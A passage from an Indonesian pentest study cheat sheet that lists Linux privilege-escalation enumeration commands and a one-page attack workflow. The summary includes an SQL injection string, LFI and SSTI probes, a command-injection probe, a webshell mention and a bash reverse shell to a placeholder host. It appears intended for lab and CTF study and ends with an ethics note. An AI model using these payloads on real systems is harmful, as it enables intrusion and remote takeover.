find / -perm -4000 -type f 2>/dev/null
```

## Q13 — Cari capabilities?

```bash
getcap -r / 2>/dev/null
```

## Q14 — Cek cron?

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

## Q15 — Bukti root?

```bash
id
hostname
```

---

# 16. Ringkasan Satu Halaman

```text
R — RECON
    netdiscover / nmap -sn
    nmap -sC -sV -p-
    dirsearch / feroxbuster

F — FOOTHOLD
    SQLi:   ' OR '1'='1'-- -
    Upload: PHP webshell
    SSTI:   {{7*7}}
    LFI:    ../../../../etc/passwd
    CMDi:   ; id

S — SHELL
    nc -lvnp 4444
    bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
    python pty

E — ENUM
    id
    sudo -l
    uname -a
    SUID/SGID
    getcap
    cron
    writable files
    credential
    internal service
    LinPEAS

P — PRIVESC
    sudo → GTFOBins
    SUID → GTFOBins + -p
    capability
    writable cron
    weak permission
    credential reuse
    kernel terakhir

P — PROOF
    id
    hostname
```

---

# 17. Catatan Etika dan Keamanan

Gunakan command dan payload pada:

- laboratorium sendiri;
- CTF;
- mesin ujian;
- sistem yang secara tertulis mengizinkan pengujian.

Jangan menjalankannya pada sistem publik atau organisasi tanpa otorisasi. Eksploit kernel, perubahan `/etc/passwd`, cron, dan SUID dapat merusak sistem. Pada lab, gunakan snapshot sebelum pengujian berisiko.

---

# 18. Sumber

- Repository: https://github.com/w4h4z/Pentest-Cheat-Sheet
- Branch: `main`
- Snapshot commit terbaru saat penyusunan: `b8c6c099c8ab06b2475472bac044ee3fb7d15186`
- Disusun: 16 Juli 2026
- Referensi tambahan yang disebut repositori:
  - GTFOBins: https://gtfobins.github.io
  - PEASS-ng/LinPEAS: https://github.com/peass-ng/PEASS-ng
  - PentestMonkey Reverse Shell Cheat Sheet
  - Revshells.com

> Materi ini merupakan ringkasan belajar. Selalu cocokkan command dengan sistem operasi, versi layanan, arsitektur, permission, dan ruang lingkup pengujian.
